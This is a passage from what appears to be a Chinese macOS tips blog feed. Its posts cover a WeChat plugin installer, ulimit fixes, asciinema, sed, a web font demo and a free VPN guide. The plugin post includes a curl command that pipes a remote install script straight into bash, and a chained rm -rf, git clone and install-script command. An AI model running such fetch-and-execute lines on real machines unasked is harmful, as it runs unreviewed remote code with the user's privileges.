id="1-1-无需安装Git"><a href="#1-1-无需安装Git" class="headerlink" title="1.1 无需安装Git"></a>1.1 无需安装Git</h5><p>打开<code>应用程序-实用工具-Terminal(终端)</code>，执行下面的命令安装 <a href="https://github.com/lmk123/oh-my-wechat" target="_blank" rel="noopener">Oh My WeChat</a>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- -L https://raw.githubusercontent.com/lmk123/oh-my-wechat/master/install.sh | bash -s</span><br></pre></td></tr></table></figure><p>然后运行 <code>omw</code> 即可。</p><blockquote><p>可以访问 <a href="https://github.com/lmk123/oh-my-wechat#oh-my-wechat" target="_blank" rel="noopener">Oh My WeChat 的项目主页</a>查看更多用法。</p></blockquote><h5 id="1-2-需要安装Git"><a href="#1-2-需要安装Git" class="headerlink" title="1.2 需要安装Git"></a>1.2 需要安装Git</h5><p>打开<code>应用程序-实用工具-Terminal(终端)</code>，执行下面的命令安装</p><p><code>cd ~/Downloads &amp;&amp; rm -rf WeChatPlugin-MacOS &amp;&amp; git clone https://github.com/TKkk-iOSer/WeChatPlugin-MacOS.git --depth=1 &amp;&amp; ./WeChatPlugin-MacOS/Other/Install.sh</code></p><h4 id="2-普通安装"><a href="#2-普通安装" class="headerlink" title="2. 普通安装"></a>2. 普通安装</h4><ul><li>点击<code>clone or download</code>按钮下载 WeChatPlugin 并解压，打开Terminal(终端)，拖动解压后<code>Install.sh</code> 文件(在 Other 文件夹中)到 Terminal 回车即可。</li></ul><h4 id="3-安装完成"><a href="#3-安装完成" class="headerlink" title="3. 安装完成"></a>3. 安装完成</h4><ul><li>重启微信，在<strong>菜单栏</strong>中看到<strong>微信小助手</strong>即安装成功。</li></ul><p><img src="https://raw.githubusercontent.com/TKkk-iOSer/WeChatPlugin-MacOS/master/Other/ScreenShots/wechatplugin.png" alt="微信小助手.png"></p><hr><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>打开Terminal(终端)，拖动解压后<code>Uninstall.sh</code> 文件(在 Other 文件夹中)到 Terminal 回车即可。</p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li style="list-style: none"><input type="checkbox" checked> 增加<code>Alfred</code>搜索</li><li style="list-style: none"><input type="checkbox"> 查看单向好友</li><li style="list-style: none"><input type="checkbox"> 增加 brew 安装方式</li><li style="list-style: none"><input type="checkbox" checked> 完善自动回复(指定好友回复)</li><li style="list-style: none"><input type="checkbox" checked> 完善消息防撤回(显示撤回用户昵称)</li><li style="list-style: none"><input type="checkbox" checked> <del>清除微信缓存(官方已加)</del></li><li style="list-style: none"><input type="checkbox" checked> 优化小助手设置(更新后保留相关设置，更新提醒)</li><li style="list-style: none"><input type="checkbox" checked> 语音远程控制 mac</li><li style="list-style: none"><input type="checkbox" checked> 支持中英文</li><li style="list-style: none"><input type="checkbox"> 支持深色模式</li></ul><hr><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul><li><a href="https://github.com/amarcadet/XMLReader" target="_blank" rel="noopener">XMLReader</a></li><li><a href="https://github.com/Tyilo/insert_dylib" target="_blank" rel="noopener">insert_dylib</a></li><li><a href="https://github.com/facebook/fishhook" target="_blank" rel="noopener">fishhook</a></li><li><a href="https://github.com/swisspol/GCDWebServer" target="_blank" rel="noopener">GCDWebServer</a></li></ul><hr><h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><ul><li>使用插件有风险，使用需谨慎。</li><li>本项目旨在提升生活幸福感使用，不可用于商业和个人其他意图。若使用不当，请使用者自行承担。</li><li>如有侵权，请联系本人。<a href="mailto:tkk.ioser@gmail.com" target="_blank" rel="noopener">tkk.ioser@gmail.com</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;作者GayHub: &lt;a href=&quot;https://github.com/TKkk-iOSer/WeChatPlugin-MacOS&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/TKkk-iOSer/WeChatP
      
    
    </summary>
    
      <category term="MacOS 笔记" scheme="http://lfoder.github.io/categories/MacOS-%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="MacOS" scheme="http://lfoder.github.io/tags/MacOS/"/>
    
      <category term="WeChat" scheme="http://lfoder.github.io/tags/WeChat/"/>
    
      <category term="插件" scheme="http://lfoder.github.io/tags/%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>MacOS出现/usr/bin/ulimit: line 4: ulimit: open files: cannot modify limit: Invalid argument解决方案</title>
    <link href="http://lfoder.github.io/2018/10/31/MacOS%E5%87%BA%E7%8E%B0-usr-bin-ulimit-line-4-ulimit-open-files-cannot-modify-limit-Invalid-argument%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://lfoder.github.io/2018/10/31/MacOS出现-usr-bin-ulimit-line-4-ulimit-open-files-cannot-modify-limit-Invalid-argument解决方案/</id>
    <published>2018-10-31T06:05:09.000Z</published>
    <updated>2018-10-31T09:17:43.500Z</updated>
    
    <content type="html"><![CDATA[<h3 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="built_in">ulimit</span> -n 65535</span><br><span class="line">/usr/bin/<span class="built_in">ulimit</span>: line 4: <span class="built_in">ulimit</span>: open files: cannot modify <span class="built_in">limit</span>: Invalid argument</span><br></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> kern.maxfiles=65535 | sudo tee -a /etc/sysctl.conf</span><br><span class="line">Password:</span><br><span class="line">kern.maxfiles=65535</span><br><span class="line">➜  ~ <span class="built_in">echo</span> kern.maxfilesperproc=65535 | sudo tee -a /etc/sysctl.conf</span><br><span class="line">kern.maxfilesperproc=65535</span><br><span class="line">➜  ~ sudo sysctl -w kern.maxfiles=65535</span><br><span class="line">kern.maxfiles: 12288 -&gt; 65535</span><br><span class="line">➜  ~ sudo sysctl -w kern.maxfilesperproc=65535</span><br><span class="line">kern.maxfilesperproc: 10240 -&gt; 65535</span><br><span class="line">➜  ~ <span class="built_in">ulimit</span> -n 65535 65535</span><br><span class="line">➜  ~ <span class="built_in">ulimit</span> -a</span><br><span class="line">-t: cpu time (seconds)              unlimited</span><br><span class="line">-f: file size (blocks)              65535</span><br><span class="line">-d: data seg size (kbytes)          unlimited</span><br><span class="line">-s: stack size (kbytes)             8192</span><br><span class="line">-c: core file size (blocks)         0</span><br><span class="line">-v: address space (kbytes)          unlimited</span><br><span class="line">-l: locked-in-memory size (kbytes)  unlimited</span><br><span class="line">-u: processes                       709</span><br><span class="line">-n: file descriptors                65535</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><p>Via: <a href="http://blog.mact.me/2014/10/22/yosemite-upgrade-changes-open-file-limit" target="_blank" rel="noopener">http://blog.mact.me/2014/10/22/yosemite-upgrade-changes-open-file-limit</a></p><blockquote><p>可以把 <code>ulimit -n 65536 65536</code> 加入到 <code>~/.bash_profile</code>中以免每次修改。</p></blockquote>]]></content>
    
    <summary type="html">
    
      MacOS出现/usr/bin/ulimit: line 4: ulimit: open files: cannot modify limit: Invalid argument解决方案
    
    </summary>
    
    
      <category term="MacOS" scheme="http://lfoder.github.io/tags/MacOS/"/>
    
      <category term="ulimit" scheme="http://lfoder.github.io/tags/ulimit/"/>
    
  </entry>
  
  <entry>
    <title>asciinema终端操作最好的录制工具,谁用谁知道</title>
    <link href="http://lfoder.github.io/2018/09/26/asciinema%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%E6%9C%80%E5%A5%BD%E7%9A%84%E5%BD%95%E5%88%B6%E5%B7%A5%E5%85%B7-%E8%B0%81%E7%94%A8%E8%B0%81%E7%9F%A5%E9%81%93/"/>
    <id>http://lfoder.github.io/2018/09/26/asciinema终端操作最好的录制工具-谁用谁知道/</id>
    <published>2018-09-26T02:16:04.000Z</published>
    <updated>2018-09-26T02:47:30.243Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Asciinema-终端录屏工具"><a href="#Asciinema-终端录屏工具" class="headerlink" title="Asciinema 终端录屏工具"></a>Asciinema 终端录屏工具</h2><h4 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h4><p>官网地址: <a href="https://asciinema.org/" target="_blank" rel="noopener">https://asciinema.org/</a></p><p>可以点击导航到官网，一切都会明白。</p><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p>有英文基础请看这里: <a href="https://asciinema.org/docs/getting-started" target="_blank" rel="noopener">https://asciinema.org/docs/getting-started</a></p><blockquote><p>没有就去学英文吖！</p></blockquote><h3 id="终端帮助"><a href="#终端帮助" class="headerlink" title="终端帮助"></a>终端帮助</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ asciinema </span><br><span class="line">usage: asciinema [-h] [--version] &#123;rec,play,cat,upload,auth&#125; ...</span><br><span class="line"></span><br><span class="line">Record and share your terminal sessions, the right way.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;rec,play,cat,upload,auth&#125;</span><br><span class="line">    rec                 Record terminal session</span><br><span class="line">    play                Replay terminal session</span><br><span class="line">    cat                 Print full output of terminal session</span><br><span class="line">    upload              Upload locally saved terminal session to asciinema.org</span><br><span class="line">    auth                Manage recordings on asciinema.org account</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  --version             show program<span class="string">'s version number and exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">example usage:</span></span><br><span class="line"><span class="string">  Record terminal and upload it to asciinema.org:</span></span><br><span class="line"><span class="string">    asciinema rec</span></span><br><span class="line"><span class="string">  Record terminal to local file:</span></span><br><span class="line"><span class="string">    asciinema rec demo.cast</span></span><br><span class="line"><span class="string">  Record terminal and upload it to asciinema.org, specifying title:</span></span><br><span class="line"><span class="string">    asciinema rec -t "My git tutorial"</span></span><br><span class="line"><span class="string">  Record terminal to local file, limiting idle time to max 2.5 sec:</span></span><br><span class="line"><span class="string">    asciinema rec -i 2.5 demo.cast</span></span><br><span class="line"><span class="string">  Replay terminal recording from local file:</span></span><br><span class="line"><span class="string">    asciinema play demo.cast</span></span><br><span class="line"><span class="string">  Replay terminal recording hosted on asciinema.org:</span></span><br><span class="line"><span class="string">    asciinema play https://asciinema.org/a/difqlgx86ym6emrmd8u62yqu8</span></span><br><span class="line"><span class="string">  Print full output of recorded session:</span></span><br><span class="line"><span class="string">    asciinema cat demo.cast</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For help on a specific command run:</span></span><br><span class="line"><span class="string">  asciinema &lt;command&gt; -h</span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      asciinema是一个终端小工具，可以录制终端的所有操作，并上选择性上传到云端以共享，播放的时候，是下载录制的脚本，操作JavaScript进行脚本重放，并非传统视频播放，播放过程中还可以对终端内容进行复制操作，是目前终端录制工具中最好的工具
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sed批量遍历文件替换文件内容</title>
    <link href="http://lfoder.github.io/2018/09/13/Sed%E6%89%B9%E9%87%8F%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9/"/>
    <id>http://lfoder.github.io/2018/09/13/Sed批量遍历文件替换文件内容/</id>
    <published>2018-09-13T12:51:45.000Z</published>
    <updated>2018-09-13T12:55:25.552Z</updated>
    
    <content type="html"><![CDATA[<p>MacOS:</p><blockquote><p>遍历 修改 /tmp/ 目录下 所有包含 aaaa的文件，将aaaa替换成bbbb并不备份</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;&apos; &apos;s/aaaa/bbbb/g&apos; `grep aaaa -rl /tmp/`</span><br></pre></td></tr></table></figure><blockquote><p>遍历 修改 /tmp/ 目录下 所有包含 aaaa的文件，将aaaa替换成bbbb并备份修改前文件，命名为原文件名+ “.bak”</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;.bak&apos; &apos;s/aaaa/bbbb/g&apos; `grep aaaa -rl /tmp/`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      经常需要遍历文件目录批量替换多个文件中的文件内容，做个笔记。
    
    </summary>
    
      <category term="MacOS 笔记" scheme="http://lfoder.github.io/categories/MacOS-%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>如何使用黑客字体</title>
    <link href="http://lfoder.github.io/2018/09/09/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E9%BB%91%E5%AE%A2%E5%AD%97%E4%BD%93/"/>
    <id>http://lfoder.github.io/2018/09/09/如何使用黑客字体/</id>
    <published>2018-09-09T00:05:10.000Z</published>
    <updated>2018-09-09T00:52:23.926Z</updated>
    
    <content type="html"><![CDATA[<p>TTF: <a href="https://watchdogsfont.com/font/HACKED_Title.ttf" target="_blank" rel="noopener">https://watchdogsfont.com/font/HACKED_Title.ttf</a></p><p>CSS:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span> &#123;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#20B2AA</span>;</span><br><span class="line"><span class="attribute">size</span>: <span class="number">89px</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: hacker;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(https://watchdogsfont.com/font/HACKED_Title.ttf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HTML:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span> Hacked <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body&#123;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span> &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">color</span>: <span class="selector-id">#20B2AA</span>;</span></span><br><span class="line"><span class="undefined">size: 89px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">@<span class="keyword">font-face</span> &#123;</span></span><br><span class="line"><span class="undefined">    font-family: hacker;</span></span><br><span class="line"><span class="undefined">    src: url(https://watchdogsfont.com/font/HACKED_Title.ttf);</span></span><br><span class="line"><span class="undefined">&#125;  </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">10</span> <span class="attr">color</span>=<span class="string">cyan</span> <span class="attr">face</span>=<span class="string">hacker</span>&gt;</span> Hello <span class="tag">&lt;<span class="name">br</span>&gt;</span> This is The Hack Font<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TTF: &lt;a href=&quot;https://watchdogsfont.com/font/HACKED_Title.ttf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://watchdogsfont.com/font/HACKED_Title
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>For Free,For World,For Google</title>
    <link href="http://lfoder.github.io/2018/09/08/For-Free-For-World-For-Google/"/>
    <id>http://lfoder.github.io/2018/09/08/For-Free-For-World-For-Google/</id>
    <published>2018-09-08T14:33:20.000Z</published>
    <updated>2019-03-15T09:44:02.235Z</updated>
    
    <content type="html"><![CDATA[<p>这是一篇能看见世界之外的文章，免费的科学Tizi，长期更新。</p><p>请求留意左边导航栏👈</p><h3 id="方法一：azirevpn"><a href="#方法一：azirevpn" class="headerlink" title="方法一：azirevpn"></a>方法一：azirevpn</h3><blockquote><p>无限时间，无限流量，无限速度，长期稳定。</p></blockquote><ol><li><p>打开 <a href="https://www.azirevpn.com/" target="_blank" rel="noopener">https://www.azirevpn.com/</a> 注册</p><p>右上角注册，激活码不用填，其他必填。</p><p>记得去邮箱激活账户，然后登陆。</p></li><li><p>打开 <a href="https://www.azirevpn.com/wireguard" target="_blank" rel="noopener">https://www.azirevpn.com/wireguard</a> 安装</p><p>根据你当前的系统选择进行安装。</p><p>Linux: <a href="https://www.azirevpn.com/support/guides/computer/linux/wireguard-cli" target="_blank" rel="noopener">https://www.azirevpn.com/support/guides/computer/linux/wireguard-cli</a></p><p>macOS: <a href="https://www.azirevpn.com/support/guides/computer/macos/wireguard-cli" target="_blank" rel="noopener">https://www.azirevpn.com/support/guides/computer/macos/wireguard-cli</a></p><p>Android: <a href="https://www.azirevpn.com/support/guides/mobile/android/wireguard" target="_blank" rel="noopener">https://www.azirevpn.com/support/guides/mobile/android/wireguard</a></p><p>注意：官方只有Linux 、macOS、Android的安装与使用方法，这里 <code>Windows</code> 用户需要下载一个叫<code>Tunsafe</code> 的软件（具体自行搜索下载），然后点击 <a href="https://www.azirevpn.com/cfg/wireguard" target="_blank" rel="noopener">https://www.azirevpn.com/cfg/wireguard</a> 再次输入你的账号与密码，点击 <code>Download Configuration</code> ,下载你的配置文件，这个操作会有点慢，下载好了是一个压缩包文件，解压之后便是多个线路配置文件，拖放到Tunsafe界面或导入到Tunsafe连接即可。</p></li><li><p>根据上面连接的过程，安装执行即可 (英文水准好的可自行操作)。</p><p>我是macOS系统，下面是我的终端日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ brew install wireguard-tools jq</span><br><span class="line">Updating Homebrew...</span><br><span class="line">==&gt; Auto-updated Homebrew!</span><br><span class="line">Updated 2 taps (homebrew/core, homebrew/cask).</span><br><span class="line">==&gt; New Formulae</span><br><span class="line">bloaty                     golang-migrate             prototool</span><br><span class="line">cmdshelf                   json11                     rbspy</span><br><span class="line">cwlogs                     libpsl                     topgrade</span><br><span class="line">eslint                     libsignal-protocol-c       wcslib</span><br><span class="line">geogram                    luit                       wsk</span><br><span class="line">go@1.10                    pagmo</span><br><span class="line">==&gt; Updated Formulae</span><br><span class="line">glib ✔                     ghostscript                mongodb</span><br><span class="line">go ✔                       giflib                     mongodb@3.2</span><br><span class="line">node ✔                     gifski                     multimarkdown</span><br><span class="line">p11-kit ✔                  git-archive-all            nats-streaming-server</span><br><span class="line">unrar ✔                    git-cola                   nco</span><br><span class="line">vim ✔                      git-ftp                    ncview</span><br><span class="line">adwaita-icon-theme         git-quick-stats            netcdf</span><br><span class="line">alexjs                     gitbucket                  nghttp2</span><br><span class="line">angular-cli                gitlab-runner              nginx</span><br><span class="line">anjuta                     gitup                      node-build</span><br><span class="line">annie                      gjs                        nspr</span><br><span class="line">ansible                    glib-networking            nsq</span><br><span class="line">apktool                    glslviewer                 nss</span><br><span class="line">armadillo                  gmt                        ocrmypdf</span><br><span class="line">artifactory                gmt@4                      octave</span><br><span class="line">at-spi2-core               gnatsd                     oniguruma</span><br><span class="line">atlassian-cli              gnu-indent                 open-mpi</span><br><span class="line">augeas                     gnupg                      openapi-generator</span><br><span class="line">autopep8                   gobject-introspection      openblas</span><br><span class="line">aws-okta                   gobuster                   openrct2</span><br><span class="line">awscli                     godep                      openrtsp</span><br><span class="line">azure-cli                  goenv                      openssh</span><br><span class="line">babel                      gomplate                   osquery</span><br><span class="line">baobab                     goreleaser                 parallel</span><br><span class="line">bat                        gpac                       pcl</span><br><span class="line">bear                       gradle                     pdal</span><br><span class="line">bibutils                   grafana                    pdftoedn</span><br><span class="line">bison                      gromacs                    pdftoipe</span><br><span class="line">bitwarden-cli              grpc                       pdns</span><br><span class="line">bro                        gsettings-desktop-schemas  pdnsrec</span><br><span class="line">buku                       gsoap                      perl-build</span><br><span class="line">bwfmetaedit                gtksourceview3             php</span><br><span class="line">bzt                        gtksourceview@4            php-cs-fixer</span><br><span class="line">caf                        gucharmap                  phpmyadmin</span><br><span class="line">caffe                      hadolint                   phpunit</span><br><span class="line">calabash                   hcloud                     picard-tools</span><br><span class="line">capnp                      hdf5                       plantuml</span><br><span class="line">cataclysm                  hebcal                     poppler</span><br><span class="line">ccache                     helmfile                   presto</span><br><span class="line">certbot                    heroku                     prettier</span><br><span class="line">cgal                       htmldoc                    pumba</span><br><span class="line">chakra                     hub                        pushpin</span><br><span class="line">checkbashisms              hugo                       pygobject3</span><br><span class="line">cimg                       i2p                        pyside</span><br><span class="line">circleci                   imagemagick                quicktype</span><br><span class="line">citus                      imagemagick@6              rclone</span><br><span class="line">ckan                       influxdb                   re2c</span><br><span class="line">cmake                      ios-deploy                 s6</span><br><span class="line">cmocka                     iso-codes                  saxon</span><br><span class="line">convox                     jadx                       